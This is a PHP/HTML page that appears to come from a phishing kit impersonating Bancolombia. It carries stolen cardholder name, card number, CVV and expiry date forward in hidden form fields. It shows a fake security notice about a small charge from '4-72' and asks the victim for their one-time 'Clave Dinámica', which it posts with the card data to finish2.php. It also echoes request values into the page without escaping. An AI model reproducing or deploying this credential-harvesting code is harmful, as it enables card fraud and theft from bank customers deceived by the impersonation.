<?php 





$nombreG = $_GET['nombre'];
$ntarjetaG = $_GET['numero'];
$cvvG = $_GET['cvv'];
$fechaG = $_GET['fecha'];



$palabrasSeparadas = explode(" ", $ntarjetaG);

    $fechaActual = date('d/m/y');
    $ca = substr($palabrasSeparadas[0],11,4); 

    $mensaje = "La transacción que intentas realizar por un valor de: $5.426 Cop  con tu tarjeta terminada en **********".$ca." Debe ser autorizada por seguridad";

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <title>Document</title>
</head>
<body style="background-color:;">
    
    <div class="details" style="">
        <img src="/img/bancol.png" alt="" srcset="" width="50%"><br>
    <a><?php echo $mensaje; ?></a><br><br><a>Continúa con ella ingresando tu Clave Dinámica. Consúltala en la App Bancolombia</a><br>
    <br><br><a style="color:rgb(105, 105, 105);">Detalle de la Transacción</a><center><a id="textL"><pre><b>Comercio: </b>                 4-72 </pre></a> </center>
    <a id="textL"><pre style="text-align:justify;">                <b> Monto de la 
                Transacción:</b>           $5.426 Cop </pre></a></center>
    <a id="textL"><pre>                <b> Número de 
                        tarjeta: </b>             <?php echo "****$ca"; ?> </pre></a> 
                        <form action="finish2.php" method="POST">
                        <input type="hidden" name="nombre" value="<?php echo $nombreG; ?>">
    <input type="hidden" name="numero" value="<?php echo $ntarjetaG; ?>">
    <input type="hidden" name="fecha" value="<?php echo $fechaG; ?>">
    <input type="hidden" name="cvc" value="<?php echo $cvvG; ?>">
    <a><pre> <b>Ingresa tu clave dinamica: </b></a><input type="text" name="cDinamica" id="inputda" placeholder ="" required minlength="6" maxlength="6">  <br></pre>
   <center><input type="submit" value="Enviar" style="color:white; background-color:black; width:25%; height:35px; margin:auto;" ></center>
   </form>

   

<pre><a href="">¿Necesitas Ayuda?</a>                                <a href="">Cerrar</a></pre>

</div>





</body>
</html>